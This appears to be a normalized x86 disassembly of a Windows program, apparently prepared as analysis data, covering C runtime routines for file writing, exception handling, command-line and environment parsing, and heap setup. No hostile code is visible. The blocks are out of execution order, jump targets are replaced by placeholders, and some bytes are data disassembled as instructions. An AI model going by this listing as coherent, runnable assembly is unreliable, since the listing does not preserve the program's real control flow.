mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_435e4e
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_432266
push esi
mov edi eax
call sub_435ead
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_432266
push ebp
mov ebp esp
sub esp 0x414
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x8 ]
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push [ ebp + 0x8 ]
call sub_43534c
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
call sub_4301d9
mov [ eax ] 0x1c
call sub_4301e2
mov [ eax ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_430166
pop ecx
call sub_4301d9
mov [ eax ] 0x9
call sub_4301e2
mov [ eax ] esi
jmp r-xdata
sub_4323f1
push ebp
mov ebp esp
push ecx
push ebx
push esi
call sub_430be3
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_43252f
pop ecx
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x54 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x54 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
pop esi
pop ebx
leave
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov edx [ rw-data ]
mov ecx [ rw-data ]
add ecx edx
push edi
cmp edx ecx
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x58 ]
cmp eax 0xc000008e
jne r-xdata
lea ecx [ edx + edx * 2 ]
shl ecx 0x2
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x58 ] 0x83
jmp r-xdata
mov edi [ esi + 0x50 ]
add ecx 0xc
and [ ecx + edi - 0x4 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
cmp edx ebx
jl r-xdata
mov ebx [ ebp + 0x8 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x58 ] 0x81
jmp r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x58 ] edi
pop ecx
pop edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x58 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0x54 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x58 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x58 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x58 ] 0x86
jmp r-xdata
mov [ esi + 0x58 ] 0x8a
sub_43252f
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax ] esi
je r-xdata
cmp [ eax ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_432569
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
mov al [ esi ]
cmp al 0x22
jne r-xdata
call sub_42f992
cmp al 0x20
jbe r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je r-xdata
mov al [ esi ]
test al al
je r-xdata
inc esi
cmp [ esi ] 0x20
ja r-xdata
cmp [ esi ] 0x22
jne r-xdata
test al al
je r-xdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe r-xdata
inc esi
jmp r-xdata
movzx eax al
push eax
call sub_435f62
test eax eax
pop ecx
je r-xdata
inc esi
jmp r-xdata
sub_4325c1
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_42f992
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_42dd9c
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_42dba0
pop ecx
push esi
call sub_42eea0
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_42ded6
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_42dd9c
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_42eea0
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_4350c0
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_42dba0
pop ecx
sub_43267a
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_42f992
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_432713
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_42dd9c
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_432713
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_42dba0
pop ecx
sub_432713
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_4328c7
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_42dd9c
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_42dd9c
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_42e2d0
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_42ded6
pop ecx
mov [ esp + 0x10 ] ebx
sub_4329f9
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x480
call sub_42dd9c
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x480 ]
push 0x1b
call sub_42dba0
pop ecx
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
and [ esi + 0x8 ] 0x0
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x24
add eax 0x480
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x4 ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ ebx + ebx * 8 ]
cmp [ ecx + eax * 4 ] 0xffffffff
lea esi [ ecx + eax * 4 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] edi
jge r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor esi esi
test edi edi
jle r-xdata
mov esi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov edi [ rw-data ]
add [ rw-data ] 0x20
mov [ esi ] eax
lea ecx [ eax + 0x480 ]
cmp eax 0x3
jne r-xdata
add [ ebp - 0x4 ] 0x4
inc esi
inc ebx
cmp esi edi
jl r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
add esi 0x4
cmp [ rw-data ] edi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov ecx [ esi ]
add eax 0x24
add ecx 0x480
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test al 0x8
jne r-xdata
push 0x480
call sub_42dd9c
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
mov cl [ ebx ]
mov [ eax + 0x4 ] cl
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_432bb5
push esi
mov esi [ esp + 0x8 ]
push 0x0
and [ esi ] 0x0
call [ GetModuleHandleA@IAT ]
cmp [ eax ] 0x5a4d
jne r-xdata
pop esi
retn
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
add eax ecx
mov cl [ eax + 0x1a ]
mov [ esi ] cl
mov al [ eax + 0x1b ]
mov [ esi + 0x1 ] al
sub_432be2
push ebp
mov ebp esp
mov eax 0x122c
call sub_42f0a0
lea eax [ ebp - 0x98 ]
push ebx
push eax
mov [ ebp - 0x98 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x122c ]
push 0x1090
push eax
push r--data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] 0x2
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_432bb5
cmp [ ebp - 0x4 ] 0x6
pop ecx
sbb eax eax
add eax 0x3
xor ebx ebx
lea ecx [ ebp - 0x122c ]
cmp [ ebp - 0x122c ] bl
je r-xdata
cmp [ ebp - 0x94 ] 0x5
jb r-xdata
lea eax [ ebp - 0x122c ]
push 0x16
push eax
push r--data
call sub_434970
add esp 0xc
test eax eax
jne r-xdata
mov al [ ecx ]
cmp al 0x61
jl r-xdata
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x19c ]
push 0x104
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
cmp [ ebp - 0x19c ] bl
lea ecx [ ebp - 0x19c ]
je r-xdata
lea eax [ ebp - 0x122c ]
jmp r-xdata
inc ecx
cmp [ ecx ] bl
jne r-xdata
cmp al 0x7a
jg r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x19c ]
push eax
lea eax [ ebp - 0x122c ]
push eax
call sub_4343a0
pop ecx
pop ecx
mov al [ ecx ]
cmp al 0x61
jl r-xdata
cmp eax ebx
je r-xdata
sub al 0x20
mov [ ecx ] al
push 0x2c
push eax
call sub_434430
pop ecx
cmp eax ebx
pop ecx
je r-xdata
inc ecx
cmp [ ecx ] bl
jne r-xdata
cmp al 0x7a
jg r-xdata
inc eax
mov ecx eax
cmp [ eax ] bl
je r-xdata
sub al 0x20
mov [ ecx ] al
push 0xa
push ebx
push eax
call sub_42e859
add esp 0xc
cmp eax 0x2
je r-xdata
cmp [ ecx ] 0x3b
jne r-xdata
cmp eax 0x3
je r-xdata
inc ecx
mov [ ecx ] bl
jmp r-xdata
cmp eax 0x1
je r-xdata
cmp [ ecx ] bl
jne r-xdata
sub_432d2a
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_432be2
cmp eax 0x3
mov [ rw-data ] eax
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x3f8
call sub_433073
pop ecx
jmp r-xdata
push 0x1
pop eax
retn
call sub_433bba
test eax eax
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_432d88
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_42d472
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_42d430
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_42d472
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_42d506
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_432e68
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_432ea1
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_432ea1
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_432ea1
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jb r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_42eea0
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_42eea0
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_4350c0
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_4350c0
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_4350d0
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_4350d0
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_4350d0
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_435fa4
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_42eea0
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_436030
add esp 0x10
sub_432ff4
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_4352b8
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
jmp sub_430c4a
pop esi
retn 0x4
sub_433058
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_433073
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ esp + 0x4 ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_4330bb
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_4330e6
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ ecx + 0x10 ]
push edi
mov edi esi
add esi 0xfffffffc
sub edi [ ecx + 0xc ]
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ecx + esi ]
lea ebx [ ecx + esi ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
mov ebx [ ecx + edx * 8 + 0x4 ]
lea ecx [ ecx + edx * 8 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
mov [ ebp - 0x4 ] ecx
sar edx 0x4
dec edx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
cmp edx 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ecx [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
add ecx [ ebp - 0xc ]
